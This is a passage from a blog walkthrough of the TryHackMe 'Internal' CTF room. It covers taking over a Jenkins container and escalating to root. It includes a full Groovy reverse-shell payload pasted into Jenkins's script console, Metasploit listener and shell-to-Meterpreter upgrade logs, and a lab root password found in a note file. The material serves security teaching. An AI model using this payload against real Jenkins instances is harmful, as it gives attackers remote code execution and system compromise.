</span></span></code></pre></div><p>I validated I was able to login with this new set of credentials and was pleased to access the jenkins admin panel.</p><p><p class=markdown-image><img src=/static/img/internal_http_jenkins_admin.png alt="jenkins admin"></p></p><h3 id=popping-a-shell-in-jenkins>Popping a shell in jenkins <a href=#popping-a-shell-in-jenkins class=anchor>üîó</a></h3><p>While I had access to the jenkins filesystem, I decided to open a shell into the container via the groovy shell for further enumeration. I prepared another listener to catch the shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; run -j
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit running as background job 5.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit completed, but no session was created.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.253.137:4444 
</span></span></code></pre></div><p>I also prepared an example shell from <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy target=_blank rel=noopener>payload all the things</a> which entered into the groovy script console of jenkins.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>String host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;10.10.253.137&#34;</span>;
</span></span><span style=display:flex><span>int port<span style=color:#f92672>=</span>4444;
</span></span><span style=display:flex><span>String cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;cmd.exe&#34;</span>;
</span></span><span style=display:flex><span>Process p<span style=color:#f92672>=</span>new ProcessBuilder<span style=color:#f92672>(</span>cmd<span style=color:#f92672>)</span>.redirectErrorStream<span style=color:#f92672>(</span>true<span style=color:#f92672>)</span>.start<span style=color:#f92672>()</span>;Socket s<span style=color:#f92672>=</span>new Socket<span style=color:#f92672>(</span>host,port<span style=color:#f92672>)</span>;InputStream pi<span style=color:#f92672>=</span>p.getInputStream<span style=color:#f92672>()</span>,pe<span style=color:#f92672>=</span>p.getErrorStream<span style=color:#f92672>()</span>, si<span style=color:#f92672>=</span>s.getInputStream<span style=color:#f92672>()</span>;OutputStream po<span style=color:#f92672>=</span>p.getOutputStream<span style=color:#f92672>()</span>,so<span style=color:#f92672>=</span>s.getOutputStream<span style=color:#f92672>()</span>;<span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>!s.isClosed<span style=color:#f92672>()){</span><span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>pi.available<span style=color:#f92672>()</span>&gt;0<span style=color:#f92672>)</span>so.write<span style=color:#f92672>(</span>pi.read<span style=color:#f92672>())</span>;<span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>pe.available<span style=color:#f92672>()</span>&gt;0<span style=color:#f92672>)</span>so.write<span style=color:#f92672>(</span>pe.read<span style=color:#f92672>())</span>;<span style=color:#66d9ef>while</span><span style=color:#f92672>(</span>si.available<span style=color:#f92672>()</span>&gt;0<span style=color:#f92672>)</span>po.write<span style=color:#f92672>(</span>si.read<span style=color:#f92672>())</span>;so.flush<span style=color:#f92672>()</span>;po.flush<span style=color:#f92672>()</span>;Thread.sleep<span style=color:#f92672>(</span>50<span style=color:#f92672>)</span>;try <span style=color:#f92672>{</span>p.exitValue<span style=color:#f92672>()</span>;break;<span style=color:#f92672>}</span>catch <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>){}}</span>;p.destroy<span style=color:#f92672>()</span>;s.close<span style=color:#f92672>()</span>;
</span></span></code></pre></div><p><p class=markdown-image><img src=/static/img/internal_http_jenkins_groovy_injection.png alt="groovy shell payload"></p></p><p>After executing the payload I caught the response on my new listener and migrated it using the <code>shell_to_meterpreter</code> module which gave me a second open meterpreter session on the host.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command shell session <span style=color:#ae81ff>3</span> opened <span style=color:#f92672>(</span>10.10.253.137:4444 -&gt; 10.10.215.86:57730<span style=color:#f92672>)</span> at 2020-12-05 06:16:05 +0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; search shell_to_me
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Modules
</span></span><span style=display:flex><span><span style=color:#f92672>================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   <span style=color:#75715e>#  Name                                    Disclosure Date  Rank    Check  Description</span>
</span></span><span style=display:flex><span>   -  ----                                    ---------------  ----    -----  -----------
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; use <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set session <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; set lport <span style=color:#ae81ff>4333</span>
</span></span><span style=display:flex><span>lport <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>4333</span>
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Upgrading session ID: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.253.137:4333 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>980808</span> bytes<span style=color:#f92672>)</span> to 10.10.215.86
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command stager progress: 100.00% <span style=color:#f92672>(</span>773/773 bytes<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Post module execution completed
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; kill sessessions -k <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Killing the following session<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>: <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Killing session <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.215.86 - Command shell session <span style=color:#ae81ff>3</span> closed.
</span></span><span style=display:flex><span>msf5 post<span style=color:#f92672>(</span>multi/manage/shell_to_meterpreter<span style=color:#f92672>)</span> &gt; sessions 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Active sessions
</span></span><span style=display:flex><span><span style=color:#f92672>===============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Id  Name  Type                   Information                                                                Connection
</span></span><span style=display:flex><span>  --  ----  ----                   -----------                                                                ----------
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>2</span>         meterpreter x86/linux  no-user @ internal <span style=color:#f92672>(</span>uid<span style=color:#f92672>=</span>33, gid<span style=color:#f92672>=</span>33, euid<span style=color:#f92672>=</span>33, egid<span style=color:#f92672>=</span>33<span style=color:#f92672>)</span> @ 10.10.215.86       10.10.253.137:4433 -&gt; 10.10.215.86:55326 <span style=color:#f92672>(</span>10.10.215.86<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>4</span>         meterpreter x86/linux  no-user @ jenkins <span style=color:#f92672>(</span>uid<span style=color:#f92672>=</span>1000, gid<span style=color:#f92672>=</span>1000, euid<span style=color:#f92672>=</span>1000, egid<span style=color:#f92672>=</span>1000<span style=color:#f92672>)</span> @ 172.17.0.2  10.10.253.137:4333 -&gt; 10.10.215.86:38946 <span style=color:#f92672>(</span>172.17.0.2<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Given my success with the previous <code>/opt</code> directory, I blindly decided to look there first in the new shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; ls /opt 
</span></span><span style=display:flex><span>Listing: /opt
</span></span><span style=display:flex><span><span style=color:#f92672>=============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode              Size  Type  Last modified              Name
</span></span><span style=display:flex><span>----              ----  ----  -------------              ----
</span></span><span style=display:flex><span>100644/rw-r--r--  <span style=color:#ae81ff>204</span>   fil   2020-08-03 03:31:42 +0000  note.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; cat /opt/note.txt
</span></span><span style=display:flex><span>Aubreanna,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them <span style=color:#66d9ef>if</span> you 
</span></span><span style=display:flex><span>need access to the root user account.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root:tr0ub13guM!@#123
</span></span></code></pre></div><p>This, much to my surprise, ended up yielding a set of root credentials which I could have, ironically, obtained without going through all the trouble of popping another shell.</p><h3 id=root-shell>Root shell <a href=#root-shell class=anchor>üîó</a></h3><p>With the new root credentials, I <code>su</code>&rsquo;d from my aubreanna shell and quickly found the final root flag in <code>root.txt</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aubreanna@internal:~$ su -
</span></span><span style=display:flex><span>Password: 
</span></span><span style=display:flex><span>root@internal:~# ls
</span></span><span style=display:flex><span>root.txt  snap
</span></span></code></pre></div><h2 id=summary>Summary <a href=#summary class=anchor>üîó</a></h2><p>I don&rsquo;t think this walkthrough faithfully captured the amount of time that I&rsquo;d spent poking around at each level of local enumeration. In my first run through, I&rsquo;d spent a significant amount of time walking through directories externally on blog, internally in the blog&rsquo;s webroot as well as within the mysql database and phpmyadmin panels. This was repeated after popping a shell in the extensive time spent walking through service configurations and poking at the locally-bound services. It wasn&rsquo;t until I&rsquo;d slowed down and started looking for out of place files that I&rsquo;d stumbled on the <code>notes.txt</code> file in <code>/opt</code>.</p></div><div class=tags><a href=https://ncatelli.github.io/tags/ctf>ctf</a>
<a href=https://ncatelli.github.io/tags/boot2root>boot2root</a>
<a href=https://ncatelli.github.io/tags/hacking>hacking</a>
<a href=https://ncatelli.github.io/tags/writeup>writeup</a>
<a href=https://ncatelli.github.io/tags/tryhackme>tryhackme</a></div></section></main><footer id=footer><div id=social><a class=symbol href=https://github.com/ncatelli/ rel=me target=_blank><svg fill="#bbb" width="28" height="28" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><title>Github</title><desc>Created with Sketch.</desc><defs/><g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)"><g id="Github" transform="translate(264.000000, 939.000000)"><path d="M8 72H64c4.418278.0 8-3.581722 8-8V8c0-4.418278-3.581722-8-8-8H8c-4.418278 811624501e-24-8 3.581722-8 8V64c541083001e-24 4.418278 3.581722 8 8 8z" id="Rounded" fill="#bbb"/><path d="M35.9985 13C22.746 13 12 23.7870921 12 37.096644c0 10.6440272 6.876 19.6751861 16.4145 22.8617681C29.6145 60.1797862 30.0525 59.4358488 30.0525 58.7973276 30.0525 58.2250681 30.0315 56.7100863 30.0195 54.6996482c-6.6765 1.4562499-8.085-3.2302544-8.085-3.2302544-1.0905-2.7829884-2.664-3.5239139-2.664-3.5239139C17.091 46.4500754 19.4355 46.4801943 19.4355 46.4801943c2.4075.1701719 3.675 2.4833051 3.675 2.4833051 2.142 3.6820383 5.6175 2.6188404 6.9855 2.0014024C30.3135 49.4077535 30.9345 48.3460615 31.62 47.7436831 26.2905 47.1352808 20.688 45.0691228 20.688 35.8361671c0-2.6308879.9345-4.781379 2.4705-6.4665327C22.911 28.7597262 22.0875 26.3110578 23.3925 22.9934585c0 0 2.016-.6475568 6.6 2.4697516C31.908 24.9285993 33.96 24.6620468 36.0015 24.6515052 38.04 24.6620468 40.0935 24.9285993 42.0105 25.4632101c4.581-3.1173084 6.5925-2.4697516 6.5925-2.4697516C49.9125 26.3110578 49.089 28.7597262 48.8415 29.3696344 50.3805 31.0547881 51.309 33.2052792 51.309 35.8361671c0 9.2555448-5.6115 11.29309-10.9575 11.8894446.860999999999997.7439374 1.629 2.2137408 1.629 4.4621184C41.9805 55.4089489 41.9505 58.0067059 41.9505 58.7973276 41.9505 59.4418726 42.3825 60.1918338 43.6005 59.9554002 53.13 56.7627944 60 47.7376593 60 37.096644 60 23.7870921 49.254 13 35.9985 13" fill="#fff"/></g></g></g></svg></a></div><div class=copyright></div></footer></body></html>